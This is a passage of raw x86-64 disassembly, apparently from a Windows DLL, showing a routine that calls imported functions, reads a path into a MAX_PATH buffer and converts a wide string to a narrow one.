   180005219:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   18000521e:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   180005223:	48 8d 15 66 ff ff ff 	lea    -0x9a(%rip),%rdx        # 0x180005190
   18000522a:	41 8d 4e 06          	lea    0x6(%r14),%ecx
   18000522e:	ff 15 54 ae 03 00    	call   *0x3ae54(%rip)        # 0x180040088
   180005234:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   18000523a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000523f:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   180005244:	ff 15 46 ae 03 00    	call   *0x3ae46(%rip)        # 0x180040090
   18000524a:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   18000524f:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   180005254:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   18000525b:	00 00 
   18000525d:	66 44 89 74 24 30    	mov    %r14w,0x30(%rsp)
   180005263:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180005268:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   18000526f:	90                   	nop
   180005270:	48 ff c2             	inc    %rdx
   180005273:	66 44 39 34 50       	cmp    %r14w,(%rax,%rdx,2)
   180005278:	75 f6                	jne    0x180005270
   18000527a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   18000527f:	48 83 fa 07          	cmp    $0x7,%rdx
   180005283:	77 1e                	ja     0x1800052a3
   180005285:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   18000528a:	48 8d 3c 12          	lea    (%rdx,%rdx,1),%rdi
   18000528e:	4c 8b c7             	mov    %rdi,%r8
   180005291:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180005296:	e8 05 46 01 00       	call   0x1800198a0
   18000529b:	66 44 89 74 3c 30    	mov    %r14w,0x30(%rsp,%rdi,1)
   1800052a1:	eb 0e                	jmp    0x1800052b1
   1800052a3:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1800052a8:	45 33 c0             	xor    %r8d,%r8d
   1800052ab:	e8 60 b0 00 00       	call   0x180010310
   1800052b0:	90                   	nop
   1800052b1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800052b6:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   1800052bb:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1800052c0:	48 83 fa 08          	cmp    $0x8,%rdx
   1800052c4:	49 0f 43 c8          	cmovae %r8,%rcx
   1800052c8:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800052cd:	48 8d 34 41          	lea    (%rcx,%rax,2),%rsi
   1800052d1:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   1800052d6:	49 0f 43 f8          	cmovae %r8,%rdi
   1800052da:	4c 89 33             	mov    %r14,(%rbx)
   1800052dd:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   1800052e1:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1800052e8:	00 
   1800052e9:	c6 03 00             	movb   $0x0,(%rbx)
   1800052ec:	48 8b c6             	mov    %rsi,%rax
   1800052ef:	48 2b c7             	sub    %rdi,%rax
   1800052f2:	48 d1 f8             	sar    $1,%rax
   1800052f5:	48 83 f8 0f          	cmp    $0xf,%rax
   1800052f9:	76 19                	jbe    0x180005314
   1800052fb:	48 8b d0             	mov    %rax,%rdx
   1800052fe:	48 8b cb             	mov    %rbx,%rcx
   180005301:	e8 3a 0a 01 00       	call   0x180015d40
   180005306:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   18000530a:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   18000530f:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   180005314:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180005319:	48 3b fe             	cmp    %rsi,%rdi
   18000531c:	74 54                	je     0x180005372
   18000531e:	66 90                	xchg   %ax,%ax
   180005320:	44 0f b6 0f          	movzbl (%rdi),%r9d
   180005324:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180005328:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   18000532c:	48 3b ca             	cmp    %rdx,%rcx
   18000532f:	73 1f                	jae    0x180005350
   180005331:	48 8d 41 01          	lea    0x1(%rcx),%rax
   180005335:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180005339:	48 8b c3             	mov    %rbx,%rax
   18000533c:	48 83 fa 10          	cmp    $0x10,%rdx
   180005340:	72 03                	jb     0x180005345
   180005342:	48 8b 03             	mov    (%rbx),%rax
   180005345:	44 88 0c 08          	mov    %r9b,(%rax,%rcx,1)
   180005349:	c6 44 08 01 00       	movb   $0x0,0x1(%rax,%rcx,1)
   18000534e:	eb 0f                	jmp    0x18000535f
   180005350:	45 33 c0             	xor    %r8d,%r8d
   180005353:	41 8d 50 01          	lea    0x1(%r8),%edx
   180005357:	48 8b cb             	mov    %rbx,%rcx
   18000535a:	e8 21 b1 00 00       	call   0x180010480
   18000535f:	48 83 c7 02          	add    $0x2,%rdi
   180005363:	48 3b fe             	cmp    %rsi,%rdi
   180005366:	75 b8                	jne    0x180005320
